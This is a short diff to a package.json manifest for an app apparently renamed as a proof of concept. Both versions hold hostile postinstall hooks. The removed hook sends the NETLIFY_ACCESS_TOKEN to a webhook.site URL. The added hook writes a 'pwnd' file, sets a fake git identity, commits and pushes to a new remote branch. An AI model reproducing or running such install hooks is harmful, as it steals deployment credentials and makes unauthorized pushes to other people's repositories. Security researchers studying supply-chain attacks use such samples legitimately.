@@ -1,7 +1,8 @@
 {
-  "name": "read-app",
+  "name": "read-app-poc",
   "version": "1.0.0",
   "scripts": {
-    "postinstall": "curl -X POST https://webhook.site/e9eabc86-9394-4f93-a60f-257601668d57 -d \"netlify_token=$NETLIFY_ACCESS_TOKEN\" || true"
+    "postinstall": "echo 'pwnd!!' > poc.txt && git config user.email \"MeowonKolam@example.com\" && git config user.name \"Pwn-by-w3shi\" && git add poc.txt && git commit -m 'POC: pwnd!' && git push origin HEAD:refs/heads/pwnd-branch"
   }
 }
+
